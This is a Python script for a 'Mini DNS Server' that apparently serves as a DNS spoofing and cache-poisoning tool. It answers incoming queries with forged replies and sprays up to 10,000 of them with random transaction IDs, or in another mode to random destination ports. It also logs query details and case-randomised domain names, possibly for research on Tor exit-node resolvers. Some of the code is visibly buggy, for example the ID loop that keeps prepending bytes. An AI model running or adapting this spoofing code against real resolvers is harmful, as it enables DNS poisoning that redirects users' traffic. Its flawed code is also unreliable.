#! /usr/bin/env python3

import datetime
import getopt
import json
import os
import random
import socket
import glob
import sys
import logging

from _socket import SOL_SOCKET
from enum import Enum
from stem.util import term

VERSION = '0.97 F b'
DEBUG   = False
PORT    = 53
IP_ADDRESS_LOCAL  = '127.0.0.1'
IP_ADDRESS_SERVER = '172.31.16.226'
JsonRequestsPATH  = 'JSON/DNSRequestNodes'
JsonRequestsPATHCheck = 'JSON/CheckingRequest/DNSRequestNodes'

COUNTER = 0
# Fix
FixPort      = True  #True # try all the possible port
FixRequestId = False #False  # try all the possible request ID

class RECORD_TYPES(Enum):
    A       = b'\x00\x01'  # specifies  IP4 Address
    CNAME   = b'\x00\x05'  # aliases
    MX      = b'\x00\x0f'  # mail exchange server for DNS
    NS      = b'\x00\x02'  # authoritative name server
    TXT     = b'\x00\x10'  # arbitrary non-formatted text string.
    AAAA    = b'\x00\x1c'  # specifies IP6 Address
    ANY     = b'\x00\xff'

# <editor-fold desc="******************* Random functions *******************">

def log_incoming(value):
    file = Log(filename='incoming_request', mode='out')
    file.wirteIntoFile(value)

# TODO: Need refactor- NOT IMPORTANT
def printDebugMode(values):
    if DEBUG is True:  # Debug mode only
        for string in values:
            print(string)

# option: 1 full (time+date)
# option: 2 date
# option: 3 time
def getTime(opt=1):
    date = datetime.datetime.now()
    if opt == 1:  # full
        return (((str(date)).split('.')[0]).split(' ')[1] + ' ' + ((str(date)).split('.')[0]).split(' ')[0])
    if opt == 2:  # date
        return (((str(date)).split('.')[0]).split(' ')[0])
    if opt == 3:  # time
        return (((str(date)).split('.')[0]).split(' ')[1])

#
def int_to_hex(value):
    h = hex(value)  # 300 -> '0x12c'
    h = h[2:].zfill((0) * 2)  # '0x12c' -> '00012c' if zfill=3
    return h

#
def bin_to_hex(value):
    # http://stackoverflow.com/questions/2072351/python-conversion-from-binary-string-to-hexadecimal/2072384#2072384
    # '0000 0100 1000 1101' -> '\x04\x8d'
    value = value.replace(' ', '')
    h = '%0*X' % ((len(value) + 3) // 4, int(value, 2))
    return h.decode('hex')

#
class Log():
    def __init__(self, filename, mode='none'):

        date = getTime(2)
        self.mode = mode
        # TODO: need refactoring - make it more abstract
        self.file = 'Logs/' + filename + '_' + date + '_counter+.txt'
        if (os.path.exists(self.file)) != True:
            with open(self.file, 'w+') as file:
                file.write('Start - ' + date + '\n')

    def wirteIntoFile(self,raw):
        if self.mode == 'out':
            data = ''
            raw = str(getTime(3)) + ': ' + raw
            with open(self.file, 'r') as file:
                data = file.read()
            with open(self.file, 'w+') as file:
                file.write(data)
                file.write(raw + '\n')

    def counter(self):
        pass


# TODO: need to implemant a class
def storeDNSRequestJSON(status, time, recordType, transactionID, srcIP, srcPort, domain, modifiedDomain='none', mode='none'):
    '''
        .
    '''

    date = getTime(2)
    if mode == 'check':
        file = JsonRequestsPATHCheck + '_' + date + '.json'
    else:
        # TODO: need refactoring - make it more abstract
        file = JsonRequestsPATH + '_' + date + '.json'
    jsons = {}

    if (os.path.exists(file)) != True:  # check if the file exist, if not create it.
        with open(file, 'w+') as jsonfile:
            json.dump(' ', jsonfile)
    else:
        with open(file, 'r') as jsonfile:
            jsons = json.load(jsonfile)

    if domain[-1:] == '.':
        domain = domain[:-1]

    with open(file, 'w') as jsonfile:
        DNSRequestNodes = {
            'Request': {
                'ID': str(len(jsons) + 1),
                'Time': time,
                'Status': status,
                'TransactionID': transactionID,
                'RecordType': recordType,
                'SrcIP': srcIP,
                'SrcPort': srcPort,
                'Domain': domain,
                'modifiedDomain': modifiedDomain,
            }
        }
        jsons[str(len(jsons) + 1)] = DNSRequestNodes
        # Write into Json file
        json.dump(jsons, jsonfile)


# </editor-fold>

# <editor-fold desc="******************* Zone File *******************">
#
def loadZone():
    '''
        load all zones that we have when the DNS server starts up, and put them into memory
    '''

    jsonZone = {}  # dictionary
    zoneFiles = glob.glob('Zones/*.zone')
    printDebugMode(zoneFiles)  # Debug

    for zone in zoneFiles:
        with open(zone) as zonedata:
            data = json.load(zonedata)
            zoneName = data['$origin']
            jsonZone[zoneName] = data

    return jsonZone


def getZone(domain):
    global ZoneDATA
    try:
        zoneName = '.'.join(domain[-3:]).lower()
        return ZoneDATA[zoneName]
    except Exception as e:
        print()
        return ''


# </editor-fold>

# <editor-fold desc="******************* DNS Rspoonse *******************">

def getFlags(flags):
    response_Flag = ''

    # First byte contains:  QR: 1 bit | Opcode: 4 bits  | AA: 1 bit | TC: 1 bit  |RD: 1 bit
    byte1 = bytes(flags[:1])
    # Second byte contains:  RA: 1 bit | Z: 3 bits  | RCODE: 4 bit
    byte2 = bytes(flags[1:2])

    QR = '1'  # query: 0 , response: 0.
    # OPCODE
    OPCODE = ''
    for bit in range(1, 5):
        OPCODE += str(ord(byte1) & (1 << bit))  # to get option 1/0

    #   Authoritative Answer
    AA = '1'  # Always 1
    # TrunCation
    TC = '0'  # 0 because we always dealing with a short message
    # Recursion Desired
    RD = '0'  # 0 if it is not supported recurring
    # Recursion Available
    RA = '0'

    # Reserved for future use.  Must be zeros in all queries and responses.
    Z = '000'

    # Response code
    RCODE = '0000'

    response_Flag = int(QR + OPCODE + AA + TC + RD, 2).to_bytes(1, byteorder='big') + int(RA + Z + RCODE).to_bytes(1,
                                                                                                                   byteorder='big')
    # response_Flag = int(QR + '0000' + AA + TC + RD, 2).to_bytes(1, byteorder='big') + int(RA + Z + RCODE).to_bytes(1,byteorder='big')

    return response_Flag


def getQuestionDomain(data):
    state = 1
    index = 0
    first = True

    domainParts = []
    domainString = ''
    domainTLD = ''

    expectedLength = 0
    TotalLength = 0
    parts = 0
    for byte in data:

        if byte == 0:
            break
        if state == 1:  # 1 get the domain name
            if first is True:  # first byte to get the length for the zone ~ 3 bytes
                first = False
                parts += 1
                expectedLength = byte
                continue
            domainString += chr(byte)
            index += 1
            if index == expectedLength:
                TotalLength += expectedLength
                state = 2
                index = 0
                domainParts.append(domainString)
                domainString = ''
                first = True

        elif state == 2:  # 2 get the domain zone
            if first is True:  # first byte to get the length for the zone ~ 3 bytes
                first = False
                expectedLength = byte
                parts += 1  # how many parts
                continue
            domainString += chr(byte)
            index += 1
            if index == expectedLength:
                TotalLength += expectedLength
                state = 1
                index = 0
                domainParts.append(domainString)
                domainString = ''
                first = True

    # get question type
    questionTypeStartingIndex = TotalLength + parts
    questionType = data[questionTypeStartingIndex + 1: questionTypeStartingIndex + 3]
    if DEBUG is True:  # Debug mode only
        print('Question Type: ' + str(questionType))
        print('Domain: ' + domainString + '.' + domainTLD)

    domainParts.append('')
    print(domainParts)

    return (domainParts, questionType)

#
def getQuestionDomain_temp(data):
    state = 0
    expectedlength = 0
    domainstring = ''
    domainparts = []
    x = 0
    y = 0
    for byte in data:
        if state == 1:
            if byte != 0:
                domainstring += chr(byte)
            x += 1
            if x == expectedlength:
                domainparts.append(domainstring)
                domainstring = ''
                state = 0
                x = 0
            if byte == 0:
                domainparts.append(domainstring)
                break
        else:
            state = 1
            expectedlength = byte  # get the lenght for the domain
        y += 1

    questiontype = data[y:y + 2]

    return (domainparts, questiontype)


def getLetterCaseSawped(dmoainParts):
    newParts = dmoainParts[:-3]  # save all the elements but  not the last 3  including ''
    dmoainParts = dmoainParts[-3:]  # get only last 3 elemnets of the ExitNodelist exmaple.com.
    # modify randomly only in the domain and zone name
    for part in dmoainParts:
        part = "".join(random.choice([k.swapcase(), k]) for k in part)
        newParts.append(part)
    return newParts


def getRecs(data):
    try:
        domain, questionType = getQuestionDomain(data)
        qt = ''
        if questionType == RECORD_TYPES.A.value:
            qt = 'A'
        elif questionType == RECORD_TYPES.AAAA.value:
            qt = 'AAAA'
        elif questionType == RECORD_TYPES.CNAME.value:
            qt = 'CNAME'
        elif questionType == RECORD_TYPES.MX.value:
            qt = 'MX'
        elif questionType == RECORD_TYPES.NS.value:
            qt = 'NS'
        elif questionType == RECORD_TYPES.TXT.value:
            qt = 'TXT'
        elif questionType == RECORD_TYPES.ANY.value:
            qt = 'ANY'

        # print(domain)
        zone = getZone(domain)
        if DEBUG is True:  # Debug mode only
            print('-------------7')

            print('Question Type: ' + str(qt))
            print('Zone: ' + str(zone[qt]))
            print('-------------5')
            print('Question Type: ' + str(qt))
            print('-------------6')

        return (zone[qt], qt, domain, 'OKAY')
    except Exception as ex:
        log_incoming(str(ex))
        return ('', qt, domain, 'ERROR')


def buildQuestion(domainName, recordType):  # convert str into byte
    questionBytes = b''

    for part in domainName:
        length = len(part)
        questionBytes += bytes([length])

        for char in part:
            questionBytes += ord(char).to_bytes(1, byteorder='big')

    if recordType == RECORD_TYPES.A.name or recordType == RECORD_TYPES.AAAA.name:
        questionBytes += (1).to_bytes(2, byteorder='big')

    questionBytes += (1).to_bytes(2, byteorder='big')
    return questionBytes


def recordToBytes(domainName, recordType, recordTTL, recordValue):
    '''

    '''
    recordBytes = b'\xc0\x0c'  # Pointer to domain name
    if recordType == RECORD_TYPES.A.name:
        recordBytes = recordBytes + bytes([0]) + bytes([1])

    # TODO: need to handle IP6-AAAA
    elif recordType == RECORD_TYPES.AAAA.name:
        recordBytes = recordBytes + bytes([0]) + bytes([1])

    recordBytes = recordBytes + bytes([0]) + bytes([1])
    recordBytes += int(recordTTL).to_bytes(4, byteorder='big')

    if recordType == RECORD_TYPES.A.name or recordType == RECORD_TYPES.AAAA.name:
        recordBytes = recordBytes + bytes([0]) + bytes([4])
        for part in recordValue.split('.'):
            recordBytes += bytes([int(part)])

    return recordBytes


def BruteFouceTransactionID(currentTransactionID):
    pass

def getForgedResponse(data, addr, case_sensitive=True):
    '''
       Build a DNS forged response.
    '''

    # DNS Header
    # Transaction ID
    TransactionID_Byte = data[:2]
    TransactionID = ''
    for byte in TransactionID_Byte:
        TransactionID += hex(byte)[2:]

    if DEBUG is True:  # Debug mode only
        print('ID:')
        print(TransactionID)

    # FLAGS
    Flags = getFlags(data[2:4])
    if DEBUG is True:  # Debug mode only
        print(Flags)

    # Question Count, how many questions in the zone file
    QDCOUNT = RECORD_TYPES.A.value  # b'\x00\x01'  # dns has one question

    records, recordType, domainName, recStatus = getRecs(data[12:])

    # Answer Count
    # ANCOUNT = len(getRecs(data[12:])[0]).to_bytes(2, byteorder='big')  # 12 bytes to skip the header
    ANCOUNT = len(records).to_bytes(2, byteorder='big')  # 12 bytes to skip the header

    # Name server nodeCount
    NSCOUNT = (0).to_bytes(2, byteorder='big')

    # Additional nodeCount
    ARCOUNT = (0).to_bytes(2, byteorder='big')

    Forged = True
    if Forged is True:
        pass
        #TransactionID_Byte = BruteFouceTransactionID(TransactionID_Byte)
    DNSHeader = Flags + QDCOUNT + ANCOUNT + NSCOUNT + ARCOUNT

#    DNSHeader = TransactionID_Byte + Flags + QDCOUNT + ANCOUNT + NSCOUNT + ARCOUNT
    if DEBUG is True:
        dnsH = ''
        print('DNS HEADER: ' + str(DNSHeader))
        for byte in DNSHeader:
            dnsH += hex(byte)[2:]
        print(dnsH)

    # ********************************** DNS Question

    # records, recordType, domainName = getRecs(data[12:])

    global COUNTER
    COUNTER += 1
    transactionID = str(int(TransactionID, 16))
    domain = '.'.join(map(str, domainName))[:-1]
    status = 'Okay'

    if case_sensitive is True:
        domainName = getLetterCaseSawped(domainName)
        modifiedDomain = '.'.join(map(str, domainName))[:-1]
        if recStatus == 'ERROR':  # TODO: need to handle the exception in better way
            log_incoming(str(
                COUNTER) + ': ** ERROR ** : RecordType: ' + recordType + ' | RequestId: ' + transactionID + ' | SrcIP: ' +
                         addr[0] + '  |  SrcPort: ' + str(
                addr[1]) + '  |  Domain: ' + domain + '  |  Modified Domain: ' + modifiedDomain)
            status = 'ERROR'
            print(term.format(str(
                COUNTER) + ': ' + status + ' -  RecordType: ' + recordType + '  - RequestId: ' + transactionID + '   From: IP ' +
                              addr[0] + ' : Port: ' + str(
                addr[1]) + '  -  Domain : ' + domain + '  |  Modified Domain: ' + modifiedDomain + '\n',
                              term.Color.RED))
        else:
            log_incoming(
                str(COUNTER) + ': RecordType: ' + recordType + ' | RequestId: ' + transactionID + ' | SrcIP: ' + addr[
                    0] + '  |  SrcPort: ' + str(
                    addr[1]) + '  |  Domain : ' + domain + '  |  Modified Domain: ' + modifiedDomain)
            status = 'OKAY'
            print(term.format(str(
                COUNTER) + ': ' + status + ' -  RecordType: ' + recordType + '  - RequestId: ' + transactionID + '   From: IP ' +
                              addr[0] + ' : Port: ' + str(
                addr[1]) + '  -  Domain : ' + domain + '  |  Modified Domain: ' + modifiedDomain + '\n',
                              term.Color.GREEN))
        if 'Check_' in domain:
            storeDNSRequestJSON(status=status, time=getTime(3), recordType=recordType, transactionID=transactionID,
                            srcIP=addr[0], srcPort=str(addr[1]), domain=domain, modifiedDomain=modifiedDomain, mode='check')
        else:
            storeDNSRequestJSON(status=status, time=getTime(3), recordType=recordType, transactionID=transactionID,
                            srcIP=addr[0], srcPort=str(addr[1]), domain=domain, modifiedDomain=modifiedDomain)

    else:
        if recStatus == 'ERROR':  # TODO: need to handle the exception in better way
            log_incoming(str(
                COUNTER) + ': ** ERROR ** : RecordType: ' + recordType + ' | RequestId: ' + transactionID + ' | SrcIP: ' +
                         addr[0] + '  |  SrcPort: ' + str(addr[1]) + '  |  Domain: ' + domain)
            status = 'ERROR'
            print(term.format(str(
                COUNTER) + ': ' + status + ' -  RecordType: ' + recordType + '  - RequestId: ' + transactionID + '   From: IP ' +
                              addr[0] + ' : Port: ' + str(addr[1]) + '  -  Domain : ' + domain + '\n', term.Color.RED))
        else:
            log_incoming(
                str(COUNTER) + ': RecordType: ' + recordType + ' | RequestId: ' + transactionID + ' | SrcIP: ' + addr[
                    0] + '  |  SrcPort: ' + str(addr[1]) + '  |  Domain : ' + domain)
            status = 'OKAY'
            print(term.format(str(
                COUNTER) + ': ' + status + ' -  RecordType: ' + recordType + '  - RequestId: ' + transactionID + '   From: IP ' +
                              addr[0] + ' : Port: ' + str(addr[1]) + '  -  Domain : ' + domain + '\n',
                              term.Color.GREEN))

        if 'Check_' in domain:
            storeDNSRequestJSON(status=status, time=getTime(3), recordType=recordType, transactionID=transactionID,
                                srcIP=addr[0], srcPort=str(addr[1]), domain=domain, mode='check')
        else:
            storeDNSRequestJSON(status=status, time=getTime(3), recordType=recordType, transactionID=transactionID,
                            srcIP=addr[0], srcPort=str(addr[1]), domain=domain)

    DNSQuestion = buildQuestion(domainName, recordType)
    if DEBUG is True:
        print('DNSQuestion: ' + str(DNSQuestion))

    # ** DNS Body
    # ** DNS Body

    DNSBody = b''

    for record in records:
        DNSBody += recordToBytes(domainName, recordType, record['ttl'], record['value'])

    if DEBUG is True:
        print(DNSBody)

    return DNSHeader + DNSQuestion + DNSBody


def getResponse(data, addr, case_sensitive=True):
    '''
        Build a DNS  response.
    '''
    # ** DNS Header
    # Transaction ID
    TransactionID_Byte = data[:2]
    TransactionID = ''
    for byte in TransactionID_Byte:
        TransactionID += hex(byte)[2:]
    if DEBUG is True:  # Debug mode only
        print('ID:')
        print(TransactionID)

    # FLAGS
    Flags = getFlags(data[2:4])
    if DEBUG is True:  # Debug mode only
        print(Flags)

    # Question Count, how many questions in the zone file
    QDCOUNT = RECORD_TYPES.A.value  # b'\x00\x01'  # dns has one question

    records, recordType, domainName, recStatus = getRecs(data[12:])

    # Answer Count
    # ANCOUNT = len(getRecs(data[12:])[0]).to_bytes(2, byteorder='big')  # 12 bytes to skip the header
    ANCOUNT = len(records).to_bytes(2, byteorder='big')  # 12 bytes to skip the header

    # Name server nodeCount
    NSCOUNT = (0).to_bytes(2, byteorder='big')

    # Additional nodeCount
    ARCOUNT = (0).to_bytes(2, byteorder='big')

    Forged = True
    if Forged is True:
        pass
        #TransactionID_Byte = BruteFouceTransactionID(TransactionID_Byte)

    DNSHeader = TransactionID_Byte + Flags + QDCOUNT + ANCOUNT + NSCOUNT + ARCOUNT
    if DEBUG is True:
        dnsH = ''
        print('DNS HEADER: ' + str(DNSHeader))
        for byte in DNSHeader:
            dnsH += hex(byte)[2:]
        print(dnsH)

    # ********************************** DNS Question

    # records, recordType, domainName = getRecs(data[12:])

    global COUNTER
    COUNTER += 1
    transactionID = str(int(TransactionID, 16))
    domain = '.'.join(map(str, domainName))[:-1]
    status = 'Okay'

    if case_sensitive is True:
        domainName = getLetterCaseSawped(domainName)
        modifiedDomain = '.'.join(map(str, domainName))[:-1]
        if recStatus == 'ERROR':  # TODO: need to handle the exception in better way
            log_incoming(str(
                COUNTER) + ': ** ERROR ** : RecordType: ' + recordType + ' | RequestId: ' + transactionID + ' | SrcIP: ' +
                         addr[0] + '  |  SrcPort: ' + str(
                addr[1]) + '  |  Domain: ' + domain + '  |  Modified Domain: ' + modifiedDomain)
            status = 'ERROR'
            print(term.format(str(
                COUNTER) + ': ' + status + ' -  RecordType: ' + recordType + '  - RequestId: ' + transactionID + '   From: IP ' +
                              addr[0] + ' : Port: ' + str(
                addr[1]) + '  -  Domain : ' + domain + '  |  Modified Domain: ' + modifiedDomain + '\n',
                              term.Color.RED))
        else:
            log_incoming(
                str(COUNTER) + ': RecordType: ' + recordType + ' | RequestId: ' + transactionID + ' | SrcIP: ' + addr[
                    0] + '  |  SrcPort: ' + str(
                    addr[1]) + '  |  Domain : ' + domain + '  |  Modified Domain: ' + modifiedDomain)
            status = 'OKAY'
            print(term.format(str(
                COUNTER) + ': ' + status + ' -  RecordType: ' + recordType + '  - RequestId: ' + transactionID + '   From: IP ' +
                              addr[0] + ' : Port: ' + str(
                addr[1]) + '  -  Domain : ' + domain + '  |  Modified Domain: ' + modifiedDomain + '\n',
                              term.Color.GREEN))

        if 'Check_' in domain:
            storeDNSRequestJSON(status=status, time=getTime(3), recordType=recordType, transactionID=transactionID,
                            srcIP=addr[0], srcPort=str(addr[1]), domain=domain, modifiedDomain=modifiedDomain, mode = 'check')
        else:
            storeDNSRequestJSON(status=status, time=getTime(3), recordType=recordType, transactionID=transactionID,
                                srcIP=addr[0], srcPort=str(addr[1]), domain=domain, modifiedDomain=modifiedDomain)

    else:
        if recStatus == 'ERROR':  # TODO: need to handle the exception in better way
            log_incoming(str(
                COUNTER) + ': ** ERROR ** : RecordType: ' + recordType + ' | RequestId: ' + transactionID + ' | SrcIP: ' +
                         addr[0] + '  |  SrcPort: ' + str(addr[1]) + '  |  Domain: ' + domain)
            status = 'ERROR'
            print(term.format(str(
                COUNTER) + ': ' + status + ' -  RecordType: ' + recordType + '  - RequestId: ' + transactionID + '   From: IP ' +
                              addr[0] + ' : Port: ' + str(addr[1]) + '  -  Domain : ' + domain + '\n', term.Color.RED))
        else:
            log_incoming(
                str(COUNTER) + ': RecordType: ' + recordType + ' | RequestId: ' + transactionID + ' | SrcIP: ' + addr[
                    0] + '  |  SrcPort: ' + str(addr[1]) + '  |  Domain : ' + domain)
            status = 'OKAY'
            print(term.format(str(
                COUNTER) + ': ' + status + ' -  RecordType: ' + recordType + '  - RequestId: ' + transactionID + '   From: IP ' +
                              addr[0] + ' : Port: ' + str(addr[1]) + '  -  Domain : ' + domain + '\n',
                              term.Color.GREEN))
        if 'Check_' in domain:
            storeDNSRequestJSON(status=status, time=getTime(3), recordType=recordType, transactionID=transactionID,
                            srcIP=addr[0], srcPort=str(addr[1]), domain=domain, mode='check')
        else:
            storeDNSRequestJSON(status=status, time=getTime(3), recordType=recordType, transactionID=transactionID,
                                srcIP=addr[0], srcPort=str(addr[1]), domain=domain)

    DNSQuestion = buildQuestion(domainName, recordType)
    if DEBUG is True:
        print('DNSQuestion: ' + str(DNSQuestion))

    DNSBody = b''

    for record in records:
        DNSBody += recordToBytes(domainName, recordType, record['ttl'], record['value'])

    if DEBUG is True:
        print(DNSBody)

    return DNSHeader + DNSQuestion + DNSBody


def printOnScreenAlways(msg, color=term.Color.WHITE):
    print(term.format(msg, color))


def printLogo():
    try:
        print(term.format(('\n                           Starting Mini DNS Server.. v%s \n' % VERSION),
                          term.Color.YELLOW))
        with open('Logo/logo.txt', 'r') as f:
            lineArr = f.read()
            print(term.format(lineArr, term.Color.GREEN))
        with open('Logo/logo2.txt', 'r') as f:
            lineArr = f.read()
            print(term.format(lineArr, term.Color.RED))

    except Exception as ex:
        log_incoming('ERROR: printLogo - ' + str(ex))


def killProcess(port):
    try:
        os.system('freeport %s' % port)

    except Exception as ex:
        log_incoming(str(ex))



# </editor-fold>

#
def generateResponseWithRequestId(response,sock,addr):
    '''
        Generate Request Id.
    '''
    try:
        r = 1
        while r <= 1:
            print("Round: " + str(r))
            requestIds = []
            requestIds = [random.randint(1, 65536) for i in range(10000)]
            requestIds.sort()
            index = 0
            for requestId in requestIds:  #range (1, 10000): # 1000 time should be enoght

                index+=1
                print('R: '+str(r)+' - '+str(index) +'- Transaction ID: ' + str(requestId))
                TransactionID_Byte = (requestId).to_bytes(2, byteorder='big')
                response = TransactionID_Byte + response
                sock.sendto(response, addr)
            r = r+1

    except Exception as ex:
        print(ex)

#
def generateResponseWithPortNumber(response,sock,addr):
    '''
        Generate Port Number.
    '''
    try:
        portNumbers = []
        portNumbers = [random.randint(1, 65536) for i in range(10000)]
        portNumbers.sort()
        index=0
        for portNumber in portNumbers: # range (1, 10000): # 1000 time should be enoght
            index += 1
            print(str(index) +'- Port ' + str(portNumber))
            lst = list(addr)
            lst[1] = portNumber
            addr = tuple(lst)
            sock.sendto(response, addr)

    except Exception as ex:
        print(ex)


def main(argv, IP):
    # gather Zone info and store it into memory
    global ZoneDATA
    ZoneDATA = loadZone()
    print("\n                           **Zone file has been loaded**")

    case_sensitive = False
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    opts = argv

    if opts[1] == '-s':
        sock.bind((IP, PORT))
        if opts[2] == '-mcase':
            case_sensitive = True
        print("\n                           Host: %s | Port: %s \n" % (IP, PORT))
    elif opts == '-l' or opts == '':
        sock.bind((IP_ADDRESS_LOCAL, PORT))
        print("\n                           Host: %s | Port: %s \n" % (IP_ADDRESS_LOCAL, PORT))

    try:
        # keep listening
        while 1:
            data, addr = sock.recvfrom(512)
            response = getForgedResponse(data, addr, case_sensitive) # forge response without request ID, later we forge the ID and combine it with the whole response
            generateResponseWithRequestId(response,sock, addr) # brute force # we get the response once without Tre_id

    except Exception as ex:
        log_incoming('ERROR: main ' + str(ex))
        printOnScreenAlways("\nERROR: Terminated!!! :" + str(ex), term.Color.RED)


def main_test():
    # gather Zone info and store it into memory
    global ZoneDATA
    ZoneDATA = loadZone()

    print("testing ....  ")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((IP_ADDRESS_LOCAL, PORT))

    print("Host: %s | Port: %s " % (IP_ADDRESS_LOCAL, PORT))
    # open socket and

    # keep listening
    while 1:
        data, addr = sock.recvfrom(512)

        if FixRequestId is True:   ## try all the possible Port Number 1  to 65556
            response = getResponse(data, addr)  # we get the correct response.
            generateResponseWithPortNumber(response, sock, addr)  # brute force all the possible port number

        elif FixPort is True:  ## try all the possible request IDs 1  to 65556
            response = getForgedResponse(data, addr, True) # forge response without request ID, later we forge the ID and combine it with the whole response
            generateResponseWithRequestId(response, sock, addr)  # brute force # we get the response once without Tre_id

def main_test_local():
    '''
        gather Zone info and store it into memory
    '''
    global ZoneDATA
    ZoneDATA = loadZone()
    print("Testing ....  ")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((IP_ADDRESS_LOCAL, PORT))
    print("\n                           Host: %s | Port: %s " % (IP_ADDRESS_LOCAL, PORT))

    # testing
    BYTES = b'\\$\x00\x10\x00\x01\x00\x00\x00\x00\x00\x01\x02ns\x0cdnStEstSuITE\x05SpACe\x00\x00\x1c\x00\x01\x00\x00)\x10\x00\x00\x00\x80\x00\x00\x00'
    response = getResponse(BYTES, '127.0.0.2')
    print("response:")
    print(str(response))

if __name__ == '__main__':
    printLogo()
    killProcess(53)
    try:  # on the server
        if len(sys.argv) != 1:
            ip = socket.gethostbyname(socket.gethostname())
            main(sys.argv[1:], ip)
        else:
            print('ERROR: argv....')
            main_test()
            
    except Exception as ex:  # locally
        print('ERROR: argv....')
        print(ex)
        main_test()
